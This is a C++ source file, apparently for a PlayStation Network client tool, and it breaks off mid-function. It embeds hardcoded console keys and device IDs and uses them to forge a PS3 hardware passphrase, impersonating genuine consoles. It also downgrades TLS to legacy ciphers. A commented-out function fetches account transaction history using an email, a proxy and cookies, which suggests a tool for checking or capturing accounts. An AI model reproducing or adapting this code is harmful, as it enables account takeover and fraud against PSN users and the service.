#include <curl/curl.h>
#include <string>
#include<iostream>
#include <mutex>
#include <openssl/x509v3.h>
#include <openssl/x509_vfy.h>
#include <openssl/crypto.h>
#include <openssl/lhash.h>
#include <openssl/objects.h>
#include <openssl/err.h>
#include <openssl/evp.h>
#include <openssl/x509.h>
#include <openssl/pkcs12.h>
#include <openssl/bio.h>
#include <openssl/ssl.h>
#include <string> 
#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <openssl/aes.h>
#include "dllPsnFunk.h"
#include<comutil.h>
#include<string.h>
#include<thread>
#include<future>

using namespace std;
#pragma comment(lib, "comsuppw.lib")

static void print_cookies(CURL* curl)
{
	CURLcode res;
	struct curl_slist* cookies;
	struct curl_slist* nc;
	int i;


	res = curl_easy_getinfo(curl, CURLINFO_COOKIELIST, &cookies);
	if (res != CURLE_OK) {
		/*	fprintf(stderr, "Curl curl_easy_getinfo failed: %s\n",
				curl_easy_strerror(res));*/
		exit(1);
	}
	nc = cookies;

	i = 1;
	while (nc) {
		printf("[%d]: %s", i, nc->data);
		printf("%s", "\"");

		nc = nc->next;
		i++;
	}
	if (i == 1) {
		printf("(none)\n");
	}
	curl_slist_free_all(cookies);
}
//std::string cert_loca(argv[0]);
	////cout << "Cert Path : "<<cert_loca << endl;
	//replace(cert_loca, "psn_fuck_console.exe", "cert.pem");
	////cout << "Cert Path : " << cert_loca << endl;
	//replaceAll(cert_loca, "\\", "\\\\");
	//cout << "Cert Path : " << cert_loca << endl;
	//cout << "Enter Sensor Data : " << endl;
	//cin.getline(post, sizeof(post));
	//char _ca_location[5000];
	//sprintf(post, argv[1]);
	//cout << "Enter Cookie : " << endl;
	////cin >> post;
	//char _cookie_0[5000];
	//cin.getline(_cookie_0, sizeof(_cookie_0));
	//int yn = 0;
	//cout << "Do You Want Use HTTP Deuber ? 0/1 (0 mean NO and 1 mean Yes) : " << endl;
	//cin >> yn;

	//if (yn == 0)
	//{
	//	cout << "Enter CA Path : " << endl;

	//	cin.getline(_ca_location, sizeof(_ca_location));
	//}
	//else 
	//{
	//	
	//}


	//char _cookie_1[5000];
	//sprintf(_cookie_1, "Cookie: %d", _cookie_0);

size_t writeFunction(void* ptr, size_t size, size_t nmemb, std::string* data) {
	data->append((char*)ptr, size * nmemb);
	return size * nmemb;
}
static size_t WriteMemoryCallback(void* contents, size_t size, size_t nmemb, void* info)
{
	size_t realsize = size * nmemb;
	//  if(realsize==4)
	//	  debug_print_hex_c(contents, realsize);

	return realsize;
}
void replaceAll(std::string& str, const std::string& from, const std::string& to) {
	if (from.empty())
		return;
	size_t start_pos = 0;
	while ((start_pos = str.find(from, start_pos)) != std::string::npos) {
		str.replace(start_pos, from.length(), to);
		start_pos += to.length(); // In case 'to' contains 'from', like replacing 'x' with 'yx'
	}
}
bool replace(std::string& str, const std::string& from, const std::string& to) {
	size_t start_pos = str.find(from);
	if (start_pos == std::string::npos)
		return false;
	str.replace(start_pos, from.length(), to);
	return true;
}
//typedef struct sslctxparm_st {
//	unsigned char* p12file;
//	const char* pst;
//	PKCS12* p12;
//	EVP_PKEY* pkey;
//	X509* usercert;
//	STACK_OF(X509)* ca;
//	CURL* curl;
//	BIO* errorbio;
//	int accesstype;
//	int verbose;
//
//} sslctxparm;
//CURLcode sslctxfun(CURL* curl, void* sslctx, void* parm)
//{
//	sslctxparm* p = (sslctxparm*)parm;
//	SSL_CTX* ctx = (SSL_CTX*)sslctx;
//
//	SSL_CTX_set_security_level(ctx, 0);
//	SSL_CTX_set_max_proto_version(ctx, TLS1_2_VERSION);
//	SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);
//	SSL_CTX_set_cipher_list(ctx, "AES256-SHA256,AES128-SHA256,AES256-SHA,AES128-SHA,DES-CBC3-SHA,RC4-SHA,RC4-MD5");
//
//	SSL_CTX_set_options(ctx, SSL_OP_NO_TICKET);
//	SSL_CTX_set_options(ctx, SSL_OP_NO_EXTENDED_MASTER_SECRET);
//	SSL_CTX_set_options(ctx, SSL_OP_NO_ENCRYPT_THEN_MAC);
//	SSL_CTX_set_options(ctx, SSL_OP_NO_COMPRESSION);
//	SSL_CTX_set_max_send_fragment(ctx, 1);
//	SSL_CONF_CTX* cctx;
//	cctx = SSL_CONF_CTX_new();
//	SSL_CONF_CTX_set_flags(cctx, SSL_CONF_FLAG_FILE);
//	SSL_CONF_CTX_set_ssl_ctx(cctx, ctx);
//	SSL_CONF_cmd(cctx, "SignatureAlgorithms", "RSA+SHA256:RSA+SHA512:RSA+SHA384:RSA+SHA1");
//
//	if (!SSL_CONF_CTX_finish(cctx)) {
//		printf("ERROR\n");
//	}
//	SSL_CTX_set_quiet_shutdown(ctx, 1);
//
//	return CURLE_OK;
//
//}
#define u32 uint32_t
#define u16 uint16_t
#define u8 uint8_t
#define u64 uint64_t
#include <sys/stat.h>
#include <fcntl.h>





//! Byte swap unsigned short
uint16_t swap_uint16(uint16_t val)
{
	return (val << 8) | (val >> 8);
}
uint16_t bswap16(uint16_t a)
{
	a = ((a & 0x00FF) << 8) | ((a & 0xFF00) >> 8);
	return a;
}

uint32_t bswap32(uint32_t a)
{
	a = ((a & 0x000000FF) << 24) |
		((a & 0x0000FF00) << 8) |
		((a & 0x00FF0000) >> 8) |
		((a & 0xFF000000) >> 24);
	return a;
}

uint64_t bswap64(uint64_t a)
{
	a = ((a & 0x00000000000000FFULL) << 56) |
		((a & 0x000000000000FF00ULL) << 40) |
		((a & 0x0000000000FF0000ULL) << 24) |
		((a & 0x00000000FF000000ULL) << 8) |
		((a & 0x000000FF00000000ULL) >> 8) |
		((a & 0x0000FF0000000000ULL) >> 24) |
		((a & 0x00FF000000000000ULL) >> 40) |
		((a & 0xFF00000000000000ULL) >> 56);
	return a;
}

static char encoding_table[] = { 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
								'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
								'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
								'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
								'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
								'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
								'w', 'x', 'y', 'z', '0', '1', '2', '3',
								'4', '5', '6', '7', '8', '9', '+', '/' };
static char* decoding_table = NULL;
static int mod_table[] = { 0, 2, 1 };


int aescbc256_encrypt(unsigned char* key, unsigned char* iv, unsigned char* plaintext,
	unsigned char* ciphertext, int plaintext_len)
{
	EVP_CIPHER_CTX* ctx;

	int len;

	int ciphertext_len;

	/* Create and initialise the context */
	if (!(ctx = EVP_CIPHER_CTX_new()))
		return -1;

	/*
	 * Initialise the encryption operation. IMPORTANT - ensure you use a key
	 * and IV size appropriate for your cipher
	 * In this example we are using 256 bit AES (i.e. a 256 bit key). The
	 * IV size for *most* modes is the same as the block size. For AES this
	 * is 128 bits
	 */
	if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
		return -1;

	/*
	 * Provide the message to be encrypted, and obtain the encrypted output.
	 * EVP_EncryptUpdate can be called multiple times if necessary
	 */
	if (1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
		return -1;
	ciphertext_len = len;

	/*
	 * Finalise the encryption. Further ciphertext bytes may be written at
	 * this stage.
	 */
	if (1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len))
		return -1;
	ciphertext_len += len;

	/* Clean up */
	EVP_CIPHER_CTX_free(ctx);

	return ciphertext_len;
}

int base64_encode1(const unsigned char* data,
	size_t input_length,
	size_t* output_length, char* output) {

	*output_length = 4 * ((input_length + 2) / 3);

	char* encoded_data = (char*)malloc((*output_length) + 1);

	for (int i = 0, j = 0; i < input_length;) {

		uint32_t octet_a = i < input_length ? (unsigned char)data[i++] : 0;
		uint32_t octet_b = i < input_length ? (unsigned char)data[i++] : 0;
		uint32_t octet_c = i < input_length ? (unsigned char)data[i++] : 0;

		uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;

		encoded_data[j++] = encoding_table[(triple >> 3 * 6) & 0x3F];
		encoded_data[j++] = encoding_table[(triple >> 2 * 6) & 0x3F];
		encoded_data[j++] = encoding_table[(triple >> 1 * 6) & 0x3F];
		encoded_data[j++] = encoding_table[(triple >> 0 * 6) & 0x3F];
	}

	for (int i = 0; i < mod_table[input_length % 3]; i++)
		encoded_data[*output_length - 1 - i] = '=';

	*(uint8_t*)(encoded_data + (*output_length)) = 0;

	//   strcpy(output, encoded_data);


	 //memcpy(output, ee);
	strcpy(output, (const char*)encoded_data);
	// strcpy(output, (unsigned char*)encoded_data);
	return 0;
}
char* base64_encode(const unsigned char* data,
	size_t input_length,
	size_t* output_length) {

	*output_length = 4 * ((input_length + 2) / 3);

	char* encoded_data = (char*)malloc((*output_length) + 1);
	if (encoded_data == NULL) return NULL;

	for (int i = 0, j = 0; i < input_length;) {

		uint32_t octet_a = i < input_length ? (unsigned char)data[i++] : 0;
		uint32_t octet_b = i < input_length ? (unsigned char)data[i++] : 0;
		uint32_t octet_c = i < input_length ? (unsigned char)data[i++] : 0;

		uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;

		encoded_data[j++] = encoding_table[(triple >> 3 * 6) & 0x3F];
		encoded_data[j++] = encoding_table[(triple >> 2 * 6) & 0x3F];
		encoded_data[j++] = encoding_table[(triple >> 1 * 6) & 0x3F];
		encoded_data[j++] = encoding_table[(triple >> 0 * 6) & 0x3F];
	}

	for (int i = 0; i < mod_table[input_length % 3]; i++)
		encoded_data[*output_length - 1 - i] = '=';

	*(uint8_t*)(encoded_data + (*output_length) + 1) = 0;

	return encoded_data;
}

void build_decoding_table() {

	decoding_table = (char*)malloc(256);

	for (int i = 0; i < 64; i++)
		decoding_table[(unsigned char)encoding_table[i]] = i;
}

unsigned char* base64_decode(const char* data,
	size_t input_length,
	size_t* output_length) {

	if (decoding_table == NULL) build_decoding_table();

	if (input_length % 4 != 0) return NULL;

	*output_length = input_length / 4 * 3;
	if (data[input_length - 1] == '=') (*output_length)--;
	if (data[input_length - 2] == '=') (*output_length)--;

	unsigned char* decoded_data = (unsigned char*)malloc((*output_length) + 1);
	if (decoded_data == NULL) return NULL;

	for (int i = 0, j = 0; i < input_length;) {

		uint32_t sextet_a = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
		uint32_t sextet_b = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
		uint32_t sextet_c = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
		uint32_t sextet_d = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];

		uint32_t triple = (sextet_a << 3 * 6)
			+ (sextet_b << 2 * 6)
			+ (sextet_c << 1 * 6)
			+ (sextet_d << 0 * 6);

		if (j < *output_length) decoded_data[j++] = (triple >> 2 * 8) & 0xFF;
		if (j < *output_length) decoded_data[j++] = (triple >> 1 * 8) & 0xFF;
		if (j < *output_length) decoded_data[j++] = (triple >> 0 * 8) & 0xFF;
	}
	uint8_t nullbyte = 0;
	*(uint8_t*)((decoded_data)+(*output_length)) = 0;
	return decoded_data;
}


void base64_cleanup() {
	free(decoding_table);
}

#define MT_N 624
#define MT_M 397
#define MT_MATRIX_A 0x9908b0df
#define MT_UPPER_MASK 0x80000000
#define MT_LOWER_MASK 0x7fffffff

/*! Mersenne-Twister 19937 context. */
typedef struct _mt19937_ctxt
{
	/*! State. */
	unsigned int state[MT_N];
	/*! Index. */
	unsigned int idx;
} mt19937_ctxt_t;

void mt19937_init(mt19937_ctxt_t* ctxt, unsigned int seed)
{
	ctxt->state[0] = seed;

	for (ctxt->idx = 1; ctxt->idx < MT_N; ctxt->idx++)
		ctxt->state[ctxt->idx] = (1812433253 * (ctxt->state[ctxt->idx - 1] ^ (ctxt->state[ctxt->idx - 1] >> 30)) + ctxt->idx);

	ctxt->idx = MT_M + 1;
}

unsigned int mt19937_update(mt19937_ctxt_t* ctxt)
{
	unsigned int y, k;
	static unsigned int mag01[2] = { 0, MT_MATRIX_A };

	if (ctxt->idx >= MT_N)
	{
		for (k = 0; k < MT_N - MT_M; k++)
		{
			y = (ctxt->state[k] & MT_UPPER_MASK) |
				(ctxt->state[k + 1] & MT_LOWER_MASK);
			ctxt->state[k] = ctxt->state[k + MT_M] ^ (y >> 1) ^ mag01[y & 1];
		}

		for (; k < MT_N - 1; k++)
		{
			y = (ctxt->state[k] & MT_UPPER_MASK) |
				(ctxt->state[k + 1] & MT_LOWER_MASK);
			ctxt->state[k] = ctxt->state[k + (MT_M - MT_N)] ^ (y >> 1) ^ mag01[y & 1];
		}

		y = (ctxt->state[MT_N - 1] & MT_UPPER_MASK) |
			(ctxt->state[0] & MT_LOWER_MASK);
		ctxt->state[MT_N - 1] = ctxt->state[MT_M - 1] ^ (y >> 1) ^ mag01[y & 1];

		ctxt->idx = 0;
	}

	y = ctxt->state[ctxt->idx++];

	y ^= (y >> 11);
	y ^= (y << 7) & 0x9d2c5680UL;
	y ^= (y << 15) & 0xefc60000UL;
	y ^= (y >> 18);

	return y;
}

static mt19937_ctxt_t _mt19937_ctxt;
static int _mt_init = 0;

u8 _get_rand_byte()
{
	if (_mt_init == 0)
	{
		_mt_init = 1;
		mt19937_init(&_mt19937_ctxt, clock());
	}

	return (u8)(mt19937_update(&_mt19937_ctxt) & 0xFF);
}

void _fill_rand_bytes(u8* dst, u32 len)
{
	u32 i;

	for (i = 0; i < len; i++)
		dst[i] = _get_rand_byte();
}

uint8_t hmac_key[0x40] = { 0x4E,0x43,0xBC,0x2C,0xAE,0xF6,0xF0,0xC3,0xE3,0xFB,0x4F,0xFA,0x8C,0x34,0x52,0x21,0x28,0xE3,0x6D,0x83,0xE7,0xEC,0x10,0xF8,0x23,0x86,0x2F,0x64,0x7A,0xB0,0xB5,0x88,0xA0,0xD8,0xAA,0x50,0xA9,0x6E,0x9E,0xD1,0xEB,0xA9,0x10,0xC0,0x7C,0x87,0x6F,0x5D,0x57,0x9C,0xC2,0xE7,0x06,0x48,0xBC,0xAE,0x98,0xD7,0x19,0xDB,0xD2,0x6C,0x2A,0x39 };
uint8_t aes_key[0x10] = { 0x48,0x67,0xB3,0x5F,0xB3,0x87,0x74,0xF6,0x65,0xEB,0x96,0xE7,0x6F,0x4D,0x16,0x65 };
uint8_t aes_iv[0x10] = { 0 };
uint8_t eid0_decrypted[0x60] = { 0x00, 0x00, 0x00, 0x01, 0x00, 0x8C, 0x00, 0x09, 0x10, 0x00, 0x30, 0x0A, 0x4B, 0x41, 0x82, 0x30, 0x6C, 0xA4, 0x7A, 0x7F, 0x03, 0x20, 0xD1, 0xDF, 0xCB, 0x42, 0x4B, 0x3E, 0x5A, 0x3B, 0x5C, 0x3C, 0x01, 0x04, 0xCD, 0x36, 0x15, 0xB2, 0x0C, 0xD9, 0x77, 0x4E, 0xC1, 0x65, 0x6F, 0x4F, 0x1D, 0x48, 0x81, 0x87, 0x57, 0xAF, 0xD5, 0xB0, 0x69, 0x1A, 0x78, 0xE4, 0xA8, 0x1E, 0xC6, 0x00, 0xE7, 0xAF, 0x45, 0x1F, 0x58, 0xCF, 0x77, 0xCB, 0xF3, 0x6F, 0x17, 0xD8, 0x38, 0x59, 0x9E, 0xA5, 0x14, 0x71, 0xEA, 0xEA, 0x7F, 0x6F, 0x56, 0xAF, 0xEF, 0x30, 0x82, 0x63, 0x8C, 0xDA, 0xDF, 0x99, 0xB9, 0xA8 };

#undef X509_NAME
#undef X509_CERT_PAIR
#undef X509_EXTENSIONS
#undef OCSP_REQUEST
#undef OCSP_RESPONSE
#include <openssl/hmac.h>
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <vector>


int aescbc128_encrypt(unsigned char* key, unsigned char* iv, unsigned char* plaintext,
	unsigned char* ciphertext, int plaintext_len)
{
	EVP_CIPHER_CTX* ctx;

	int len;

	int ciphertext_len;

	/* Create and initialise the context */
	if (!(ctx = EVP_CIPHER_CTX_new()))
		return -1;

	/*
	 * Initialise the encryption operation. IMPORTANT - ensure you use a key
	 * and IV size appropriate for your cipher
	 * In this example we are using 256 bit AES (i.e. a 256 bit key). The
	 * IV size for *most* modes is the same as the block size. For AES this
	 * is 128 bits
	 */
	if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv))
		return -1;

	/*
	 * Provide the message to be encrypted, and obtain the encrypted output.
	 * EVP_EncryptUpdate can be called multiple times if necessary
	 */
	if (1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
		return -1;
	ciphertext_len = len;

	/*
	 * Finalise the encryption. Further ciphertext bytes may be written at
	 * this stage.
	 */
	if (1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len))
		return -1;
	ciphertext_len += len;

	/* Clean up */
	EVP_CIPHER_CTX_free(ctx);

	return ciphertext_len;
}

unsigned int as_hex(char c)
{
	if ('0' <= c && c <= '9') { return c - '0'; }
	if ('a' <= c && c <= 'f') { return c + 10 - 'a'; }
	if ('A' <= c && c <= 'F') { return c + 10 - 'A'; }
	return 0;
}

uint8_t idps_hex[0x10] = { 0x00,0x00,0x00,0x01,0x00,0x85,0x00,0x0b,0xf4,0x02,0xb8,0xca,0x22,0x3a,0x56,0xae };
void generate_unique_framework(struct NPpp_FRAMEWORK* FRAMEWORK)
{
	char npid[0x11] = { "6cc2ff94d06a5c20" };
	char np_magic[5] = { "NPpp" };
	memcpy(FRAMEWORK, np_magic, 4);
	FRAMEWORK->version = bswap32(1);
	FRAMEWORK->size = bswap16(0x200);
	FRAMEWORK->unk[5] = 1;
	memcpy(FRAMEWORK->npid, npid, 0x10);
	_fill_rand_bytes(FRAMEWORK->random, 0x10);
	FRAMEWORK->unix_timestamp = bswap64(time(NULL));
	memcpy(FRAMEWORK->eid0_dec, idps_hex, 0x10);
	memcpy(FRAMEWORK->eid0_dec + 0x10, eid0_decrypted + 0x10, 0x50);
	memset(FRAMEWORK->pad, 0, 0X148);
	aescbc128_encrypt(aes_key, aes_iv, (unsigned char*)FRAMEWORK->random, (unsigned char*)FRAMEWORK->random, 0x1d0);

	unsigned char* result = HMAC(EVP_sha256(), hmac_key, 0x40, (const unsigned char*)FRAMEWORK->magic, 0x1e0, NULL, NULL);
	memcpy(FRAMEWORK->hmac_sha256, result, 0x20);
}
typedef struct sslctxparm_st {
	unsigned char* p12file;
	const char* pst;
	PKCS12* p12;
	EVP_PKEY* pkey;
	X509* usercert;
	STACK_OF(X509)* ca;
	CURL* curl;
	BIO* errorbio;
	int accesstype;
	int verbose;

} sslctxparm;
CURLcode sslctxfun(CURL* curl, void* sslctx, void* parm)
{
	sslctxparm* p = (sslctxparm*)parm;
	SSL_CTX* ctx = (SSL_CTX*)sslctx;

	SSL_CTX_set_security_level(ctx, 0);
	SSL_CTX_set_max_proto_version(ctx, TLS1_2_VERSION);
	SSL_CTX_set_min_proto_version(ctx, TLS1_1_VERSION);
	SSL_CTX_set_cipher_list(ctx, "AES256-SHA256,AES128-SHA256,AES256-SHA,AES128-SHA,DES-CBC3-SHA,RC4-SHA,RC4-MD5");

	SSL_CTX_set_options(ctx, SSL_OP_NO_TICKET);
	//	SSL_CTX_set_options(ctx, SSL_OP_NO_EXTENDED_MASTER_SECRET);
	SSL_CTX_set_options(ctx, SSL_OP_NO_ENCRYPT_THEN_MAC);
	SSL_CTX_set_options(ctx, SSL_OP_NO_COMPRESSION);
	SSL_CTX_set_max_send_fragment(ctx, 1);
	SSL_CONF_CTX* cctx;
	cctx = SSL_CONF_CTX_new();
	SSL_CONF_CTX_set_flags(cctx, SSL_CONF_FLAG_FILE);
	SSL_CONF_CTX_set_ssl_ctx(cctx, ctx);
	SSL_CONF_cmd(cctx, "SignatureAlgorithms", "RSA+SHA256:RSA+SHA512:RSA+SHA384:RSA+SHA1");

	if (!SSL_CONF_CTX_finish(cctx)) {
		printf("ERROR\n");
	}
	SSL_CTX_set_quiet_shutdown(ctx, 1);

	return CURLE_OK;
}
uint8_t*
hex_decode(const char* in, size_t len, uint8_t* out)
{
	unsigned int i, t, hn, ln;

	for (t = 0, i = 0; i < len; i += 2, ++t) {

		hn = in[i] > '9' ? in[i] - 'A' + 10 : in[i] - '0';
		ln = in[i + 1] > '9' ? in[i + 1] - 'A' + 10 : in[i + 1] - '0';

		out[t] = (hn << 4) | ln;
	}

	return out;
}

long long current_timestamp() {
	struct timeval te {};
	//gettimeofday(&te, NULL); // get current time
	long long milliseconds = te.tv_sec * 1000LL + te.tv_usec / 1000; // calculate milliseconds
	// printf("milliseconds: %lld\n", milliseconds);
	return milliseconds;
}
unsigned char* hmac_sha256(const void* key, int keylen,
	const unsigned char* data, int datalen,
	unsigned char* result, unsigned int* resultlen)
{
	return HMAC(EVP_sha256(), key, keylen, data, datalen, result, resultlen);
}
uint64_t swap_uint64(uint64_t val)
{
	val = ((val << 8) & 0xFF00FF00FF00FF00ULL) | ((val >> 8) & 0x00FF00FF00FF00FFULL);
	val = ((val << 16) & 0xFFFF0000FFFF0000ULL) | ((val >> 16) & 0x0000FFFF0000FFFFULL);
	return (val << 32) | (val >> 32);
}
char* base64encode(const void* b64_encode_this, int encode_this_many_bytes) {
	BIO* b64_bio, * mem_bio;      //Declares two OpenSSL BIOs: a base64 filter and a memory BIO.
	BUF_MEM* mem_bio_mem_ptr;    //Pointer to a "memory BIO" structure holding our base64 data.
	b64_bio = BIO_new(BIO_f_base64());                      //Initialize our base64 filter BIO.
	mem_bio = BIO_new(BIO_s_mem());                           //Initialize our memory sink BIO.
	BIO_push(b64_bio, mem_bio);            //Link the BIOs by creating a filter-sink BIO chain.
	BIO_set_flags(b64_bio, BIO_FLAGS_BASE64_NO_NL);  //No newlines every 64 characters or less.
	BIO_write(b64_bio, b64_encode_this, encode_this_many_bytes); //Records base64 encoded data.
	BIO_flush(b64_bio);   //Flush data.  Necessary for b64 encoding, because of pad characters.
	BIO_get_mem_ptr(mem_bio, &mem_bio_mem_ptr);  //Store address of mem_bio's memory structure.
	BIO_set_close(mem_bio, BIO_NOCLOSE);   //Permit access to mem_ptr after BIOs are destroyed.
	BIO_free_all(b64_bio);  //Destroys all BIOs in chain, starting with b64 (i.e. the 1st one).
	BUF_MEM_grow(mem_bio_mem_ptr, (*mem_bio_mem_ptr).length + 1);   //Makes space for end null.
	(*mem_bio_mem_ptr).data[(*mem_bio_mem_ptr).length] = '\0';  //Adds null-terminator to tail.
	return (*mem_bio_mem_ptr).data; //Returns base-64 encoded data. (See: "buf_mem_st" struct).
}
typedef struct passphrase
{
	uint8_t header[0x10];
	uint8_t random[0x10];
	uint8_t eid0_dec_first[0x60];
	uint64_t timestamp;
	uint8_t ascii_npid[0x10];
	uint8_t padding[0x148];
	uint8_t sha256_hmac[0x20];
} hwframework;
char* generate_hwframework(char* idps_ascii, uint8_t* npid_ascii)
{
	uint8_t eid0_dec_bin[0x60] = {
		0x00, 0x00, 0x00, 0x01, 0x00, 0x85, 0x00, 0x09, 0x14, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
		0x2B, 0xEA, 0x4F, 0x4C, 0x2A, 0x6F, 0xE1, 0xF7, 0xD6, 0x4D, 0x06, 0x9B, 0x2F, 0xDA, 0x31, 0x08,
		0xAB, 0x21, 0x89, 0xE1, 0x4A, 0xB1, 0xC8, 0x23, 0x12, 0x86, 0x9F, 0x41, 0x4E, 0x86, 0x80, 0x17,
		0xF8, 0xD3, 0xB4, 0xA9, 0x40, 0xF4, 0xAA, 0x20, 0x69, 0xF4, 0x30, 0x36, 0x7A, 0x0E, 0x83, 0x78,
		0x06, 0x30, 0x35, 0x79, 0xB1, 0xF2, 0x56, 0xDD, 0x19, 0x8B, 0x5A, 0x04, 0x83, 0x41, 0xE0, 0x23,
		0x44, 0x84, 0xD0, 0x5E, 0xBB, 0xAA, 0xB1, 0x7E, 0xFB, 0xC4, 0x09, 0x6E, 0x7A, 0xA1, 0xC0, 0x4B
	};

	uint8_t idps[0x10];
	hex_decode(idps_ascii, 32, idps);
	memcpy(eid0_dec_bin, idps, 0x10);

	uint8_t passphrase_key[0x10] = { 0x48,0x67,0xB3,0x5F,0xB3,0x87,0x74,0xF6,0x65,0xEB,0x96,0xE7,0x6F,0x4D,0x16,0x65 };
	uint8_t sha256_key[0x40] = { 0x4E,0x43,0xBC,0x2C,0xAE,0xF6,0xF0,0xC3,0xE3,0xFB,0x4F,0xFA,0x8C,0x34,0x52,0x21,0x28,0xE3,0x6D,0x83,0xE7,0xEC,0x10,0xF8,0x23,0x86,0x2F,0x64,0x7A,0xB0,0xB5,0x88,0xA0,0xD8,0xAA,0x50,0xA9,0x6E,0x9E,0xD1,0xEB,0xA9,0x10,0xC0,0x7C,0x87,0x6F,0x5D,0x57,0x9C,0xC2,0xE7,0x06,0x48,0xBC,0xAE,0x98,0xD7,0x19,0xDB,0xD2,0x6C,0x2A,0x39 };
	uint32_t hashlen = 0;
	uint8_t iv_null[0x10] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
	//	size_t base64_out_len;
	uint8_t header_npid[0x10] = { 0x4e, 0x50, 0x70, 0x70, 0x00, 0x00, 0x00, 0x01, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01 };

	hwframework* PASSPHRASE = (hwframework*)malloc(sizeof(hwframework));

	PASSPHRASE->timestamp = swap_uint64(current_timestamp());
	srand(time(NULL));
	int i = 0;
	for (i; i < 0x10; i++)
	{
		PASSPHRASE->random[i] = rand();
	}
	memcpy(PASSPHRASE->eid0_dec_first, eid0_dec_bin, 0x60);
	memset(PASSPHRASE->padding, 0, 0x148);
	memcpy(PASSPHRASE->ascii_npid, npid_ascii, 0x10);
	memcpy(PASSPHRASE->header, header_npid, 0x10);

	AES_KEY enc_key;
	AES_set_encrypt_key(passphrase_key, 128, &enc_key);
	AES_cbc_encrypt((const unsigned char*)PASSPHRASE + 0x10, (unsigned char*)PASSPHRASE + 0x10, 0x1d0, &enc_key, iv_null, AES_ENCRYPT);
	hmac_sha256(sha256_key, 0x40, (const unsigned char*)PASSPHRASE, 0x1e0, PASSPHRASE->sha256_hmac, &hashlen);
	char* base64_encoded = base64encode(PASSPHRASE, 0x200);
	//	base64_out_len=strlen(base64_encoded);
	//	FILE *output_data=fopen("data.bin", "w");
	//	fwrite((const unsigned char *)base64_encoded, base64_out_len, 1, output_data);
	///	fclose(output_data);

	return base64_encoded;
}
char* base64decode(const void* b64_decode_this, int decode_this_many_bytes) {
	BIO* b64_bio, * mem_bio;      //Declares two OpenSSL BIOs: a base64 filter and a memory BIO.
	char* base64_decoded = (char*)calloc((decode_this_many_bytes * 3) / 4 + 1, sizeof(char)); //+1 = null.
	b64_bio = BIO_new(BIO_f_base64());                      //Initialize our base64 filter BIO.
	mem_bio = BIO_new(BIO_s_mem());                         //Initialize our memory source BIO.
	BIO_write(mem_bio, b64_decode_this, decode_this_many_bytes); //Base64 data saved in source.
	BIO_push(b64_bio, mem_bio);          //Link the BIOs by creating a filter-source BIO chain.
	BIO_set_flags(b64_bio, BIO_FLAGS_BASE64_NO_NL);          //Don't require trailing newlines.
	int decoded_byte_index = 0;   //Index where the next base64_decoded byte should be written.
	while (0 < BIO_read(b64_bio, base64_decoded + decoded_byte_index, 1)) { //Read byte-by-byte.
		decoded_byte_index++; //Increment the index until read of BIO decoded data is complete.
	} //Once we're done reading decoded data, BIO_read returns -1 even though there's no error.
	BIO_free_all(b64_bio);  //Destroys all BIOs in chain, starting with b64 (i.e. the 1st one).
	return base64_decoded;        //Returns base-64 decoded data with trailing null terminator.
}
int choose_rand_idps(uint8_t* idps, uint8_t* ps3_ids)
{
	srand(time(NULL));
	int random_val = rand() % 10;
	memcpy(idps, ps3_ids + (random_val * 0x10), 0x10);
	return 0;
}
char ps3_ids_encoded[0xD9] = { "AAAAAQCEAAsQM2Yz/jtCzwAAAAEAhQAKFAE8O4DS5XYAAAABAIUACRQMIBSUedVDAAAAAQCFAAkQIljgo7V9IwAAAAEAhQAKEANULfqpmK0AAAABAIUACRQDDB1Gaa3oAAAAAQCFAAkQADMgNMp/LgAAAAEAigAJEABnst1gF8AAAAABAIoACxQAbchVFxFhAAAAAQCFAAv0ASYTdkxIlg==" };

uint8_t* ps3_ids = (uint8_t*)base64decode(ps3_ids_encoded, 0xD8);


size_t CurlWrite_CallbackFunc_StdString(void* contents, size_t size, size_t nmemb, std::string* s)
{
	size_t newLength = size * nmemb;
	try
	{
		s->append((char*)contents, newLength);
	}
	catch (std::bad_alloc& e)
	{
		//handle memory problem
		return 0;
	}
	return newLength;
}
//int Capture(string email,string proxy,string cookies) {
//
//	string par = "transactionSearchCriteria.loginName=" + email + "&transactionSearchCriteria.fromYear=2010&transactionSearchCriteria.fromMonth=3&transactionSearchCriteria.fromDay=4&transactionSearchCriteria.toYear=2020&transactionSearchCriteria.toMonth=10&transactionSearchCriteria.toDay=22&transactionSearchCriteria.timezone=0";
//	string strcookie = "Cookie: " + cookies;
//	char proxy1[5000];
//	sprintf(proxy1, proxy.c_str());
//
//	CURLcode res;
//	struct curl_slist* chunk = NULL;
//	curl_global_init(CURL_GLOBAL_ALL);
//	auto curl = curl_easy_init();
//	if (curl) {
//		srand(time(NULL));
//
//		struct NPpp_FRAMEWORK* FRAMEWORK = (NPpp_FRAMEWORK*)malloc(sizeof(struct NPpp_FRAMEWORK));
//		generate_unique_framework(FRAMEWORK);
//		uint64_t outlen;
//		//char* passphrase = base64_encode((const unsigned char*)FRAMEWORK, 0x200, &outlen);
//
